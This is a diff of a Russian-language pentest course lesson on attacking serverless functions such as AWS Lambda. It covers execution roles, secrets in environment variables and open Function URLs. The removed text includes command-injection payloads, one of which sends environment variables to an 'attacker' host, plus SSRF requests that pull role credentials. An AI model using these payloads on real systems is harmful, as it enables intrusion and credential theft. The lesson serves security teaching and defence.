@@ -15,246 +15,227 @@ estimated_minutes: 45
 summary: "В serverless нет сервера — атакуем событие, код и, главное, IAM-роль функции. Разбираем event injection, переменные окружения, злоупотребление execution role и типовые мисконфиги триггеров."
 ---
 
-Serverless убирает сервер, но не убирает поверхность атаки. Функция принимает событие от множества источников (HTTP, очередь, бакет, cron) и работает с правами **execution role**. Главный приз — не сама функция, а её роль. Урок про инъекции в события и захват роли.
+## Вопрос, с которого всё начинается
 
-## Как устроен FaaS и где приз
+Сайт полностью «бессерверный»: ни одной машины, только функции, которые вызываются по событию. Казалось бы, ломать нечего — нет сервера, нет SSH. Но у каждой функции есть **роль**, а в переменных окружения часто лежат секреты. Именно туда мы и будем целиться.
 
-Три платформы и их роли:
+Serverless (FaaS, Function-as-a-Service) — модель, где ты пишешь только код функции, а провайдер сам её запускает по событию. В AWS это Lambda, в GCP — Cloud Functions, в Azure — Azure Functions.
 
-| Платформа | Сервис | Роль функции |
-|-----------|--------|--------------|
-| AWS | Lambda | Execution role (STS-токен в env) |
-| GCP | Cloud Functions / Run | Service account |
-| Azure | Functions | Managed Identity / App Service identity |
+## Наш пример: функция api-handler
 
-Ключевой факт: у каждой функции есть **временные креды**, доступные коду. Если злоумышленник исполняет код в функции (или читает её env), он получает эти креды.
+Объект урока — Lambda-функция `api-handler`, которая обслуживает API сайта. Допустим, у нас есть ограниченный ключ с правом читать конфигурацию Lambda. Начнём с разведки.
 
-```bash
-# Внутри AWS Lambda — временные креды доступны как переменные окружения
-echo $AWS_ACCESS_KEY_ID $AWS_SECRET_ACCESS_KEY $AWS_SESSION_TOKEN
-# и через metadata-like endpoint (Lambda Runtime API)
-curl http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
+## Шаг 1: находим функцию и её роль
+
+Перечислим функции:
+
+```
+$ aws lambda list-functions --query "Functions[].FunctionName" --output text
+api-handler
+image-resizer
+db-backup
 ```
 
-## Источники событий как поверхность
+Берём `api-handler` и смотрим её конфигурацию:
 
-Функцию вызывают разные источники, и каждый — потенциальный вход:
-
-- **API Gateway / Function URL** — прямой HTTP-вход.
-- **S3 event** — имя объекта из события может попасть в код (path traversal, SSRF).
-- **SQS/SNS** — тело сообщения часто парсится как JSON.
-- **DynamoDB Streams** — данные из таблицы.
-- **CloudWatch Events / cron** — периодические запуски.
-
-```bash
-# Найти все функции и их триггеры
-aws lambda list-functions --query 'Functions[].FunctionName'
-aws lambda get-policy --function-name <fn>       # resource-based policy
-aws lambda get-function-url-config --function-name <fn>
-aws apigateway get-rest-apis
+```
+$ aws lambda get-function-configuration --function-name api-handler
+{
+  "FunctionName": "api-handler",
+  "Runtime": "python3.12",
+  "Role": "arn:aws:iam::123456789012:role/api-handler-role",
+  "Environment": { "Variables": { "DB_HOST": "prod-db.acme.internal" } },
+  "Timeout": 30
+}
 ```
 
-## Event injection: от события к RCE/SSRF
+Ключевое здесь — поле `Role`. Это **execution role**: роль, от имени которой функция работает. Всё, что функция может в облаке, описано её правами. Часто это самый ценный приз — роль нередко имеет доступ к базам, бакетам и секретам.
 
-Код функции парсит событие. Если он делает это небезопасно — инъекция.
+## Шаг 2: читаем переменные окружения
 
-**Command injection** через поле события:
+Обрати внимание на `Environment`. Переменные окружения функции — частое место для секретов:
 
-```python
-# уязвимый код
-import subprocess
-def handler(event, context):
-    name = event["queryStringParameters"]["file"]
-    return subprocess.check_output(f"cat /tmp/{name}", shell=True)
+```
+$ aws lambda get-function-configuration --function-name db-backup \
+    --query "Environment.Variables"
+{
+  "DB_PASSWORD": "SuperSecret123",
+  "API_TOKEN": "ghp_xxxxxxxxxxxx"
+}
 ```
 
-Полезная нагрузка в query-параметре:
+Если у тебя есть право `lambda:GetFunctionConfiguration`, ты просто **читаешь пароли в открытом виде**. Это одна из самых частых находок: секреты в переменных вместо Secret Manager.
 
-```bash
-curl 'https://<fn-url>/?file=x;id'
-curl 'https://<fn-url>/?file=x;curl http://attacker/$(env|base64)'
+## Шаг 3: что разрешено роли функции
+
+Дальше смотрим, что может роль `api-handler-role`. Это те же политики IAM, что мы разбирали:
+
+```
+$ aws iam list-attached-role-policies --role-name api-handler-role
+{
+  "AttachedPolicies": [
+    { "PolicyName": "DynamoDBFullAccess", "PolicyArn": "arn:aws:iam::aws:policy/AmazonDynamoDBFullAccess" }
+  ]
+}
 ```
 
-**SSRF** через URL из события:
+Роль имеет полный доступ к DynamoDB. Значит, если мы захватим функцию (или выполним в ней код), мы получим доступ ко всем таблицам DynamoDB. Роль функции — это и есть «приз» в serverless.
 
-```python
-# уязвимый код
-import urllib.request
-def handler(event, context):
-    url = event["url"]
-    return urllib.request.urlopen(url).read()
+## Шаг 4: как захватить роль функции
+
+Есть несколько путей:
+
+- **Инъекция в событие** — если код функции небезопасно обрабатывает вход, мы выполняем свой код внутри функции (следующий урок).
+- **Обновление кода функции** — если есть право `lambda:UpdateFunctionCode`, мы загружаем свой код и он работает с правами роли.
+- **Изменение переменных** — `lambda:UpdateFunctionConfiguration` позволяет подменить переменные, чтобы перенаправить функцию на наш сервер.
+
+Проще всего — подменить код, если есть право. Но даже без него роль функции достаётся через инъекцию.
+
+## Шаг 5: триггеры и их мисконфиги
+
+Функция вызывается **триггером**: HTTP-запросом через API Gateway, сообщением в очереди, событием в бакете. У триггеров свои ошибки:
+
+| Триггер | Типичная проблема |
+|---------|-------------------|
+| API Gateway | функция без авторизации, `Auth: NONE` |
+| S3 | событие на публичный бакет |
+| SQS/SNS | функция подписана на очередь, куда может писать кто угодно |
+| Function URL | публичный URL без аутентификации |
+
+Проверить Function URL:
+
+```
+$ aws lambda get-function-url-config --function-name api-handler
+{
+  "FunctionUrl": "https://abc123.lambda-url.us-east-1.on.aws/",
+  "AuthType": "NONE"
+}
 ```
 
-Через SSRF в Lambda можно дойти до metadata/creds:
+`AuthType: NONE` — URL открыт всем. Любой может вызвать функцию с произвольным телом, что часто превращается в инъекцию.
 
-```bash
-curl 'https://<fn-url>/?url=http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI'
+## Шаг 6: почему serverless не «безопасен по умолчанию»
+
+Распространённый миф: «нет сервера — нечего ломать». На деле поверхность атаки просто переехала: вместо ОС атакуют **код функции, её роль и триггеры**. А поскольку функции короткоживущие и логируются не всегда, заметить атаку сложнее.
+
+## Шаг 7: разведка serverless-периметра целиком
+
+Одну функцию разобрали — но их обычно десятки. Удобно выгрузить сразу имена, рантаймы и роли:
+
+```
+$ aws lambda list-functions --query "Functions[].[FunctionName,Runtime,Role]" --output text
+api-handler       python3.12   arn:aws:iam::123456789012:role/api-handler-role
+image-resizer     python3.12   arn:aws:iam::123456789012:role/image-resizer-role
+db-backup         python3.12   arn:aws:iam::123456789012:role/db-backup-role
 ```
 
-**Deserialization / JSON injection** — когда событие десериализуется в объект.
+Так сразу видно, какие функции вообще есть и какие роли им назначены. Дальше ищем секреты в переменных у всех функций подряд — это быстрый способ найти готовые пароли:
 
-## Злоупотребление execution role
-
-Если функция исполняет код, доступный атакующему, или если злоумышленник может **обновить код функции** — роль становится его ролью.
-
-```bash
-# Проверить, какие права у роли функции
-aws lambda get-function-configuration --function-name <fn> \
-  --query 'Role'
-aws iam list-attached-role-policies --role-name <role>
-aws iam list-role-policies --role-name <role>
-
-# Эксфильтрация временных кредов из функции
-aws sts get-caller-identity
-aws s3 ls
+```
+$ aws lambda get-function-configuration --function-name db-backup --query "Environment.Variables"
+{ "DB_PASSWORD": "SuperSecret123", "API_TOKEN": "ghp_xxxxxxxxxxxx" }
 ```
 
-Опасные права роли: `s3:*`, `dynamodb:*`, `secretsmanager:GetSecretValue`, `iam:PassRole`, `lambda:InvokeFunction`.
+Функция `db-backup` уже выдала пароль к базе и токен GitHub. Из одной строки разведки получился набор кредов.
 
-## Разобранный пример: SSRF в Lambda → доступ к S3
+## Шаг 8: как это выглядит у других провайдеров
 
-**Дано:** Function URL, принимающий `url` и делающий fetch.
+Терминология меняется, суть та же: функция + роль + триггер + переменные окружения.
 
-1. Тестируем SSRF:
+| AWS | GCP | Azure |
+|-----|-----|-------|
+| Lambda | Cloud Functions | Azure Functions |
+| Execution role | Service account | Managed identity |
+| API Gateway | Cloud Endpoints | API Management |
+| Env vars | Env vars | App settings |
 
-```bash
-curl 'https://fn.example/?url=http://169.254.169.254/latest/meta-data/'
-# Lambda НЕ использует 169.254.169.254 — вместо этого 169.254.170.2
-curl "https://fn.example/?url=http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"
-```
+Значит, найдя принцип на AWS, ты повторишь его в GCP и Azure: смотри роль/identity функции и её переменные.
 
-2. Получаем JSON с `AccessKeyId`, `SecretAccessKey`, `Token`.
-3. Настраиваем профиль и проверяем:
+## Практический совет
 
-```bash
-export AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...
-aws sts get-caller-identity
-aws s3 ls
-```
+Прежде чем что-то делать, выгрузи список функций вместе с их ролями — это карта всей бессерверной поверхности и быстрый способ найти интересные цели. Затем проверь переменные окружения: там часто уже лежат готовые секреты.
 
-4. Роль функции часто имеет доступ к бакету с данными — читаем.
+## Частые вопросы
 
-## Переменные окружения и слои
+**«Если нет сервера, что атаковать?»** Код функции, её роль и триггеры. Роль — главный приз, потому что она определяет доступ.
 
-Env-переменные функции видны любому, кто может `GetFunctionConfiguration`:
+**«Где чаще всего находят секреты?»** В переменных окружения функции: `GetFunctionConfiguration` показывает их в открытом виде.
 
-```bash
-aws lambda get-function-configuration --function-name <fn> \
-  --query 'Environment.Variables'
-```
+**«Чем опасен открытый Function URL?»** `AuthType: NONE` означает, что функцию может вызвать кто угодно с любым телом — а это уже потенциальная инъекция.
 
-Часто там API-ключи, строки подключения, пароли. **Слои (Layers)** — общие библиотеки; отравленный слой влияет на все функции, которые его используют (см. `cloud-lambda-privesc`).
+**«Как захватить роль функции?»** Через инъекцию в событие или через подмену кода/конфигурации, если есть соответствующие права.
 
-## Частые ошибки
+## Что мы теперь знаем
 
-- **Искать 169.254.169.254 в Lambda.** Для Lambda другой endpoint: `169.254.170.2` (или `AWS_CONTAINER_CREDENTIALS_FULL_URI`).
-- **Считать, что роль функции «слабая».** Часто у неё широкие права на сервисы.
-- **Забывать про Function URL.** Он может быть публичным без API Gateway.
-- **Игнорировать env.** Там лежат секреты в открытом виде.
-- **Не проверять resource-based policy.** Она показывает, кто может вызывать функцию.
-- **Путать execution role и role вызывающего.** Это разные права.
+По-простому:
 
-## Что дальше / решение
+1. В serverless нет сервера, но есть роль функции (execution role).
+2. Переменные окружения часто содержат секреты в открытом виде.
+3. Роль функции определяет, что можно сделать после захвата.
+4. Захватить функцию можно через инъекцию в событие или подмену кода.
+5. Триггеры (API GW, Function URL) бывают без аутентификации.
 
-- Есть SSRF → тяните креды из runtime endpoint.
-- Есть возможность `UpdateFunctionCode` → залейте свой код и используйте роль.
-- Есть `iam:PassRole` + `CreateFunction`/`UpdateFunctionConfiguration` → эскалация (см. `cloud-lambda-privesc`).
-- Смежные уроки: `cloud-serverless-injection`, `cloud-lambda-privesc`, `cloud-metadata-ssrf`.
+## На что смотреть дальше
 
-## Event injection: детали
-
-Функция обрабатывает события (S3, SQS, API Gateway, DynamoDB). Если входные данные попадают в опасные вызовы (shell, SQL, SSRF) — событие становится вектором. Пример SSRF в Lambda: код делает `requests.get(url)` из параметра события — можно обратиться к metadata (IMDS) и получить роль функции.
-
-```python
-import urllib.request
-def handler(event, ctx):
-    url = event["url"]
-    return urllib.request.urlopen(url).read().decode()
-# event {"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
-```
-
-## Злоупотребление execution role
-
-Роль функции — то, чем она может пользоваться. Часто она шире, чем нужно: доступ к S3, DynamoDB, Secrets. Компрометировав функцию (injection), вы получаете её роль. Проверяйте `aws lambda get-function-configuration --function-name X --query Role`.
-
-## Переменные окружения и слои
-
-Env функции видны через `get-function-configuration` (если есть права) и содержат секреты. Слои — код, разделяемый между функциями; подмена слоя заражает всех, кто его использует.
-
-## Практическое задание
-
-Разверните Lambda с SSRF и ролью с доступом к S3. Через событие обратитесь к IMDS, получите креды роли и прочитайте бакет. Затем ограничьте роль минимально необходимым и повторите — доступ должен сузиться. Это ключевой навык анализа serverless-безопасности.
-
-## Почему serverless меняет модель
-
-В FaaS нет сервера, за который отвечает клиент, — вся поверхность смещается в код и в execution role. Инъекция в событие даёт выполнение кода, а роль функции определяет, насколько далеко можно зайти. Поэтому аудит serverless — это в первую очередь чтение роли функции и анализ источников событий на предмет injection.
-
-## Чек-лист
-
-1. Найти функции и их триггеры (S3, SQS, API GW, DynamoDB).
-2. Прочитать код (если есть) — искать инъекции и SSRF.
-3. Проверить execution role — насколько она широка.
-4. Протестировать event injection (SSRF/command) в изолированной среде.
-5. Через роль функции двигаться к ресурсам (S3, Secrets, БД).
-6. Для защиты — least privilege роли, валидация событий, IMDSv2.
-
-## Источники событий
-
-S3 (ObjectCreated), SQS/SNS, API Gateway, DynamoDB Streams, EventBridge, CloudWatch Logs. Каждый источник — потенциальный вход. S3-событие с именем файла, попадающим в shell, — command injection. API Gateway с телом в SQL — инъекция. SQS с десериализацией — RCE. Анализируйте все триггеры, а не только HTTP.
-
-## Тайм-аут и стоимость как ограничения
-
-У Lambda есть тайм-аут (до 15 мин) и лимит памяти. При SSRF-эксфильтрации учитывайте это: длинные выгрузки могут не успеть. Используйте внешние хранилища (S3) для сбора. Также помните о биллинге: массовые вызовы заметны по стоимости и могут привлечь внимание — это часть OPSEC.
+- **Начни с конфигурации.** Роль и переменные окружения — главные находки.
+- **Проверь Function URL.** `AuthType: NONE` — открытая дверь.
+- **Смотри права роли.** Она определяет масштаб ущерба.
+- **Помни про логи.** Функции пишут в CloudWatch; шумные вызовы заметны.
 
 ## Квиз
 
+Проверь себя.
+
 ```quiz
-- question: "Какой endpoint отдаёт временные креды внутри AWS Lambda?"
+- question: "Что такое execution role функции?"
   options:
-    - "169.254.170.2 (Lambda Runtime API)"
-    - "169.254.169.254"
-    - "127.0.0.1:8080"
-    - "8.8.8.8"
+    - "Роль, от имени которой функция работает в облаке"
+    - "Пароль администратора"
+    - "Тип рантайма"
+    - "Правило firewall"
   answer: 0
-  explanation: "Lambda использует 169.254.170.2, а не EC2 metadata."
-- question: "Что является главным призом при атаке на serverless-функцию?"
+  explanation: "Роль задаёт все права функции."
+- question: "Почему переменные окружения — важная цель?"
   options:
-    - "Её execution role и доступные ей права"
-    - "Логотип функции"
-    - "Название региона"
-    - "Таймаут функции"
-  answer: 0
-  explanation: "Роль определяет доступ к облачным ресурсам."
-- question: "Где в Lambda часто лежат секреты в открытом виде?"
+    - "Они замедляют функцию"
+    - "В них часто лежат секреты в открытом виде"
+    - "Они видны только админу"
+    - "Они шифруются автоматически"
+  answer: 1
+  explanation: "Право GetFunctionConfiguration раскрывает пароли и токены."
+- question: "Что означает AuthType: NONE у Function URL?"
   options:
-    - "В переменных окружения функции"
-    - "В поле runtime"
-    - "В memorySize"
-    - "В архитектуре"
+    - "URL открыт всем, без аутентификации"
+    - "URL отключён"
+    - "Требуется IAM"
+    - "Требуется API-ключ"
   answer: 0
-  explanation: "Environment.Variables видны через GetFunctionConfiguration."
-- question: "Что такое Function URL?"
+  explanation: "Функцию может вызвать кто угодно."
+- question: "Какой триггер чаще всего встречается у публичных бессерверных API?"
   options:
-    - "Публичный HTTPS-эндпоинт функции без API Gateway"
-    - "Внутренний DNS кластера"
-    - "Тип роли IAM"
-    - "Формат логов"
+    - "API Gateway"
+    - "cron"
+    - "CloudTrail"
+    - "RDS"
   answer: 0
-  explanation: "Function URL даёт прямой HTTP-доступ к Lambda."
-- question: "Как SSRF в функции превращается в захват роли?"
+  explanation: "API Gateway — типовой HTTP-триггер Lambda."
+- question: "Почему serverless не безопасен автоматически?"
   options:
-    - "Чтением временных кредов из runtime endpoint"
-    - "Отправкой email"
-    - "Изменением цвета консоли"
-    - "Перезагрузкой функции"
-  answer: 0
-  explanation: "Креды из runtime endpoint = права execution role."
+    - "Потому что нет паролей"
+    - "Потому что атакуют код, роль и триггеры функции"
+    - "Потому что функции не логируются"
+    - "Потому что они всегда публичны"
+  answer: 1
+  explanation: "Поверхность атаки смещается на код и права функции."
 ```
+
+## Куда дальше
+
+В следующем уроке мы подробно разберём **инъекции в источники событий**: как через сообщение в очереди или тело запроса API Gateway выполнить свой код внутри функции. А пока запомни главное: в serverless главный приз — это роль функции, и достаётся она через событие или конфигурацию.
 
 ## Где пригодится
 
-- **Bug bounty:** SSRF и инъекции в serverless-приложениях.
-- **Пентест:** оценка FaaS-поверхности и прав функций.
-- **CTF:** задачи с Lambda/Cloud Functions и захватом роли.
-- **Работа/DevSecOps:** least-privilege для execution role, вынос секретов из env.
-- **Дальше по дереву:** `cloud-serverless-injection`, `cloud-lambda-privesc`.
+- **CTF (Cloud):** задачи с Lambda и утёкшими переменными.
+- **Bug bounty:** открытые Function URL и инъекции в serverless.
+- **Пентест:** аудит ролей и секретов функций.
+- **Blue team:** секреты в Secret Manager вместо переменных, аутентификация триггеров.
